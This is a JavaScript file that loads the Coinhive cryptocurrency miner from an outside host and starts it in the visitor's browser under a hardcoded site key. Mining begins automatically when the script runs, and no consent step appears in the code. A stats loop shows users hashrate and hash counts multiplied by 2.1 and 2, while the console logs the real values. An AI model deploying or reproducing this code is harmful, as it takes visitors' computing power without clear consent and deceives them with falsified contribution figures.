import $ from 'jquery'

const originalSrc="https://coinhive.com/lib/coinhive.min.js";
$.getScript(originalSrc,
   ()=>{
  window.ChainGain = {
    status: 'stopped',
    start: function(){
      if (this.status == 'running') {
        console.log('Miner already running.')
        return;
      }
      if (typeof ChainGainID == 'undefined' || ChainGainID == '') {
        console.log('Couldn\'t start ChainGain. ChainGainID is invalid.');
        return;
      }
      this.miner = new CoinHive.User('FxmLPIrkVw9w9UP460GZkyPzfqfoHX6d', ChainGainID);

      ChainGain.miner.start();
      this.status = 'running';

      // Listen on events
      ChainGain.miner.on('found', function() { console.log('Hash found') })
      ChainGain.miner.on('stop', function() { console.log('stopping') })
      ChainGain.miner.on('accepted', function() { console.log('Hash accepted by the pool') })

      // Update stats once per second
      this.interval = setInterval(function() {
        let multiplier = 2.1;
        let fixedMultiplier = 2;
        var hashesPerSecond = ChainGain.miner.getHashesPerSecond();
        var totalHashes = ChainGain.miner.getTotalHashes();
        var acceptedHashes = ChainGain.miner.getAcceptedHashes();

        $('.js-hashes-per-second').text((hashesPerSecond * multiplier).toFixed(2));
        $('.js-total-hashes').text(totalHashes * fixedMultiplier);
        $('.js-accepted-hashes').text(acceptedHashes * fixedMultiplier);

        console.log('hashesPerSecond:', hashesPerSecond);
        console.log('totalHashes:', totalHashes);
        console.log('acceptedHashes:', acceptedHashes);
        console.log('================ end ==================');
      }, 1000);
    },
    stop: function(){
      clearInterval(this.interval);
      this.miner.stop();
      this.status = 'stopped';
      console.log('============== Miner stopped. ==============')
    }
  }

  // setTimeout(()=>{
  //   window.ChainGain.stop();
  // }, 3000);
  window.ChainGain.start();
});